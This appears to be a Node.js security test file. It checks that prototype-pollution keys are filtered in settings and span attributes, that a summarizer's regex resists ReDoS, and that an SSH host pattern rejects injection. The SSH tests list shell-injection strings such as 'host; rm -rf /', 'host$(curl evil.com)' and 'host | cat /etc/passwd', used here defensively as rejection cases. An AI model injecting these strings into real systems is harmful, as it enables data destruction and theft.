/**
 * Security Round 15 Tests
 *
 * Covers:
 * 1. Prototype pollution prevention in settings.js mergeDeep
 * 2. Prototype pollution prevention in context.js Span.setAttributes
 * 3. ReDoS mitigation in summarizer.js _parseResponse
 * 4. SSH tunnel host validation in stateset-daemon.js
 */

import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';

// =============================================================================
// Test 1: Prototype Pollution in settings.js mergeDeep
// =============================================================================

import {
  loadAgentSettings,
  resetAgentSettingsCache,
  DEFAULT_AGENT_SETTINGS,
} from '../../src/settings.js';

describe('settings.js — prototype pollution prevention', () => {
  beforeEach(() => {
    resetAgentSettingsCache();
    // Ensure clean env so we don't load unexpected settings files
    delete process.env.STATESET_SETTINGS;
  });

  afterEach(() => {
    // Safety net: confirm Object.prototype was never polluted
    assert.equal(
      Object.prototype.isAdmin,
      undefined,
      'Object.prototype.isAdmin must remain undefined after every test',
    );
    assert.equal(
      Object.prototype.polluted,
      undefined,
      'Object.prototype.polluted must remain undefined after every test',
    );
    resetAgentSettingsCache();
  });

  it('mergeDeep filters __proto__ keys in overrides', () => {
    // JSON.parse materializes __proto__ as a plain property (not as prototype access)
    const malicious = JSON.parse('{"__proto__":{"isAdmin":true}}');
    const result = loadAgentSettings(malicious, { reload: true });

    assert.equal(Object.prototype.isAdmin, undefined);
    assert.equal(result.isAdmin, undefined);
    // __proto__ key should have been skipped entirely
    assert.equal(result.__proto__?.isAdmin, undefined);
  });

  it('mergeDeep filters constructor key in overrides', () => {
    const malicious = { constructor: { prototype: { polluted: true } } };
    const result = loadAgentSettings(malicious, { reload: true });

    assert.equal(Object.prototype.polluted, undefined);
    assert.equal(result.constructor?.prototype?.polluted, undefined);
  });

  it('mergeDeep filters prototype key in overrides', () => {
    const malicious = { prototype: { polluted: true } };
    const result = loadAgentSettings(malicious, { reload: true });

    assert.equal(Object.prototype.polluted, undefined);
    // The 'prototype' key itself should not appear in the merged result
    assert.equal(result.prototype, undefined);
  });

  it('mergeDeep filters nested __proto__ in deep objects', () => {
    const malicious = {
      agent: {
        __proto__: { isAdmin: true },
      },
    };
    const result = loadAgentSettings(malicious, { reload: true });

    assert.equal(Object.prototype.isAdmin, undefined);
    // The normal agent.default should still be present from defaults
    assert.equal(result.agent.default, DEFAULT_AGENT_SETTINGS.agent.default);
  });

  it('legitimate overrides still work correctly', () => {
    const overrides = {
      memory: { enabled: true },
      privacy: { redactLogs: false },
    };
    const result = loadAgentSettings(overrides, { reload: true });

    assert.equal(result.memory.enabled, true);
    assert.equal(result.privacy.redactLogs, false);
    // Other defaults should be preserved
    assert.equal(result.memory.useMarkdown, true);
  });

  it('all three dangerous keys are filtered simultaneously', () => {
    const malicious = {
      __proto__: { a: 1 },
      constructor: { b: 2 },
      prototype: { c: 3 },
      // legitimate key should survive
      memory: { enabled: true },
    };
    const result = loadAgentSettings(malicious, { reload: true });

    assert.equal(Object.prototype.a, undefined);
    assert.equal(Object.prototype.b, undefined);
    assert.equal(Object.prototype.c, undefined);
    assert.equal(result.memory.enabled, true);
  });

  it('array values in overrides are not treated as objects for deep merge', () => {
    const overrides = {
      retry: { retryableErrors: ['custom_error'] },
    };
    const result = loadAgentSettings(overrides, { reload: true });

    // Arrays should be replaced, not merged
    assert.deepStrictEqual(result.retry.retryableErrors, ['custom_error']);
  });
});

// =============================================================================
// Test 2: Prototype Pollution in context.js Span.setAttributes
// =============================================================================

import { Span, RequestContext } from '../../src/context.js';

describe('context.js Span.setAttributes — prototype pollution prevention', () => {
  /** @type {Span} */
  let span;

  beforeEach(() => {
    const ctx = new RequestContext({ agent: 'test' });
    span = ctx.createSpan('test-span');
  });

  afterEach(() => {
    assert.equal(
      Object.prototype.polluted,
      undefined,
      'Object.prototype.polluted must remain undefined',
    );
  });

  it('filters __proto__ from attributes', () => {
    span.setAttributes({ __proto__: { polluted: true }, validKey: 'ok' });

    assert.equal(Object.prototype.polluted, undefined);
    assert.equal(span.attributes.validKey, 'ok');
    // The __proto__ property should not be set as a regular key
    assert.equal(Object.hasOwn(span.attributes, '__proto__'), false);
  });

  it('filters constructor from attributes', () => {
    span.setAttributes({ constructor: { polluted: true }, validKey: 'ok' });

    assert.equal(Object.prototype.polluted, undefined);
    assert.equal(span.attributes.validKey, 'ok');
    assert.equal(Object.hasOwn(span.attributes, 'constructor'), false);
  });

  it('filters prototype from attributes', () => {
    span.setAttributes({ prototype: { polluted: true }, validKey: 'ok' });

    assert.equal(Object.prototype.polluted, undefined);
    assert.equal(span.attributes.validKey, 'ok');
    assert.equal(Object.hasOwn(span.attributes, 'prototype'), false);
  });

  it('accepts normal string attributes', () => {
    span.setAttributes({
      'http.method': 'GET',
      'http.url': '/api/orders',
      'http.status_code': 200,
    });

    assert.equal(span.attributes['http.method'], 'GET');
    assert.equal(span.attributes['http.url'], '/api/orders');
    assert.equal(span.attributes['http.status_code'], 200);
  });

  it('handles null/undefined attrs gracefully', () => {
    assert.doesNotThrow(() => span.setAttributes(null));
    assert.doesNotThrow(() => span.setAttributes(undefined));
  });

  it('returns the span for chaining', () => {
    const result = span.setAttributes({ key: 'value' });
    assert.equal(result, span);
  });

  it('setAttribute (singular) still works for dangerous-looking keys', () => {
    // setAttribute does NOT filter keys (it's explicit single-key setting)
    // This test documents the behavior difference
    span.setAttribute('normalKey', 'value');
    assert.equal(span.attributes.normalKey, 'value');
  });

  it('filters all three dangerous keys when provided together', () => {
    span.setAttributes({
      __proto__: { a: 1 },
      constructor: { b: 2 },
      prototype: { c: 3 },
      safe: 'yes',
    });

    assert.equal(Object.prototype.a, undefined);
    assert.equal(Object.prototype.b, undefined);
    assert.equal(Object.prototype.c, undefined);
    assert.equal(span.attributes.safe, 'yes');
    assert.equal(Object.keys(span.attributes).length, 1);
  });

  it('does not pollute prototype via JSON.parse attack vector', () => {
    const malicious = JSON.parse(
      '{"__proto__":{"polluted":true},"constructor":{"prototype":{"polluted":true}},"ok":"fine"}',
    );
    span.setAttributes(malicious);

    assert.equal(Object.prototype.polluted, undefined);
    assert.equal(span.attributes.ok, 'fine');
  });
});

// =============================================================================
// Test 3: ReDoS in summarizer.js _parseResponse
// =============================================================================

import { ConversationSummarizer } from '../../src/memory/summarizer.js';

describe('summarizer.js _parseResponse — ReDoS mitigation', () => {
  let summarizer;

  beforeEach(() => {
    summarizer = new ConversationSummarizer({ apiKey: null });
  });

  it('parses well-formed SUMMARY + FACTS correctly', () => {
    const text =
      'SUMMARY: Customer ordered 3 widgets.\nFACTS: ["order #456", "widget x3", "$89.97"]';
    const result = summarizer._parseResponse(text, 42);

    assert.equal(result.summary, 'Customer ordered 3 widgets.');
    assert.deepStrictEqual(result.facts, ['order #456', 'widget x3', '$89.97']);
    assert.equal(result.tokenCount, 42);
  });

  it('parses multiline SUMMARY correctly', () => {
    const text = 'SUMMARY: Line one.\nLine two of summary.\nFACTS: ["fact1"]';
    const result = summarizer._parseResponse(text, 10);

    assert.ok(result.summary.includes('Line one.'));
    assert.ok(result.summary.includes('Line two'));
    assert.deepStrictEqual(result.facts, ['fact1']);
  });

  it('handles pathological input with many opening brackets within time limit', () => {
    // This is a classic ReDoS payload for greedy .* inside brackets
    // With the non-greedy fix (.*?), this should complete quickly
    const pathological = 'FACTS: ' + '['.repeat(10000);

    const start = performance.now();
    const result = summarizer._parseResponse(pathological, 0);
    const elapsed = performance.now() - start;

    assert.ok(elapsed < 100, `_parseResponse took ${elapsed.toFixed(1)}ms, expected < 100ms`);
    // Should not crash; facts should be empty since the JSON is malformed
    assert.ok(Array.isArray(result.facts));
  });

  it('handles pathological nested bracket input within time limit', () => {
    // Another ReDoS vector: alternating brackets
    const pathological = 'FACTS: ' + '[[[['.repeat(2500) + ']]]]'.repeat(2500);

    const start = performance.now();
    const result = summarizer._parseResponse(pathological, 0);
    const elapsed = performance.now() - start;

    assert.ok(elapsed < 100, `_parseResponse took ${elapsed.toFixed(1)}ms, expected < 100ms`);
    assert.ok(Array.isArray(result.facts));
  });

  it('handles pathological SUMMARY input within time limit', () => {
    // Craft input that could cause backtracking in the SUMMARY regex
    const pathological = 'SUMMARY: ' + 'a\n'.repeat(5000) + 'FACTS:';

    const start = performance.now();
    const result = summarizer._parseResponse(pathological, 0);
    const elapsed = performance.now() - start;

    assert.ok(elapsed < 100, `_parseResponse took ${elapsed.toFixed(1)}ms, expected < 100ms`);
    assert.ok(typeof result.summary === 'string');
  });

  it('handles input with no closing bracket for FACTS', () => {
    const text = 'SUMMARY: Test\nFACTS: ["fact1", "fact2"';

    const start = performance.now();
    const result = summarizer._parseResponse(text, 5);
    const elapsed = performance.now() - start;

    assert.ok(elapsed < 100, `_parseResponse took ${elapsed.toFixed(1)}ms, expected < 100ms`);
    // The non-greedy regex should still extract what it can or return empty
    assert.ok(Array.isArray(result.facts));
  });

  it('correctly parses FACTS with special characters', () => {
    const text = 'SUMMARY: Test.\nFACTS: ["email: alice@test.com", "order #123 ($45.99)"]';
    const result = summarizer._parseResponse(text, 10);

    assert.deepStrictEqual(result.facts, ['email: alice@test.com', 'order #123 ($45.99)']);
  });

  it('handles very long FACTS array within time limit', () => {
    const facts = Array.from({ length: 100 }, (_, i) => `"fact_${i}"`).join(', ');
    const text = `SUMMARY: Lots of facts.\nFACTS: [${facts}]`;

    const start = performance.now();
    const result = summarizer._parseResponse(text, 200);
    const elapsed = performance.now() - start;

    assert.ok(elapsed < 100, `_parseResponse took ${elapsed.toFixed(1)}ms, expected < 100ms`);
    assert.equal(result.facts.length, 100);
  });
});

// =============================================================================
// Test 4: SSH Tunnel Host Validation
// =============================================================================

describe('SSH tunnel host validation pattern', () => {
  // This regex is extracted from bin/stateset-daemon.js sshTunnelPersistent()
  const SSH_HOST_PATTERN = /^[a-zA-Z0-9._@:[\]-]+$/;

  describe('valid hosts pass', () => {
    const validHosts = [
      'user@hostname',
      'deploy@192.168.1.1',
      '192.168.1.1',
      '10.0.0.1',
      '[::1]',
      'host.domain.com',
      'user@host.domain.com',
      'user@host-name.domain.com',
      'root@server01',
      'user@host:22',
      'deploy@my_server',
      'user@192.168.1.1:2222',
      'simple-host',
      'host.with.many.dots.com',
      'user@host_with_underscores',
    ];

    for (const host of validHosts) {
      it(`accepts: ${host}`, () => {
        assert.ok(SSH_HOST_PATTERN.test(host), `Expected "${host}" to be valid`);
      });
    }
  });

  describe('shell injection attempts are rejected', () => {
    const maliciousHosts = [
      'host; rm -rf /',
      'host$(whoami)',
      'host`id`',
      'host | cat /etc/passwd',
      'host & background',
      'host && echo pwned',
      'host || echo pwned',
      'host > /tmp/out',
      'host < /dev/null',
      "host'injection",
      'host"injection',
      'host\nnewline',
      'host$(curl evil.com)',
      'host`curl evil.com`',
      '$(rm -rf /)',
      '`rm -rf /`',
      'host;id',
      'host\tinjection',
      'host\\escape',
      'host{brace}',
      'host(paren)',
      'host=value',
      'host%encoded',
      'host#comment',
      'host!bang',
      'host~tilde',
      'host^caret',
      'host*glob',
      'host?wildcard',
    ];

    for (const host of maliciousHosts) {
      it(`rejects: ${host.replace(/\n/g, '\\n').replace(/\t/g, '\\t')}`, () => {
        assert.equal(SSH_HOST_PATTERN.test(host), false, `Expected "${host}" to be rejected`);
      });
    }
  });

  it('rejects empty string', () => {
    assert.equal(SSH_HOST_PATTERN.test(''), false);
  });

  it('rejects whitespace-only input', () => {
    assert.equal(SSH_HOST_PATTERN.test(' '), false);
    assert.equal(SSH_HOST_PATTERN.test('  '), false);
  });

  it('rejects host with embedded spaces', () => {
    assert.equal(SSH_HOST_PATTERN.test('host name'), false);
    assert.equal(SSH_HOST_PATTERN.test('user@ host'), false);
  });

  it('allows IPv6 bracket notation', () => {
    assert.ok(SSH_HOST_PATTERN.test('[::1]'));
    assert.ok(SSH_HOST_PATTERN.test('[2001:db8::1]'));
  });

  it('allows hyphenated hostnames', () => {
    assert.ok(SSH_HOST_PATTERN.test('my-server'));
    assert.ok(SSH_HOST_PATTERN.test('user@my-server-01'));
  });

  it('allows port syntax with colon', () => {
    assert.ok(SSH_HOST_PATTERN.test('user@host:22'));
    assert.ok(SSH_HOST_PATTERN.test('host:2222'));
  });
});
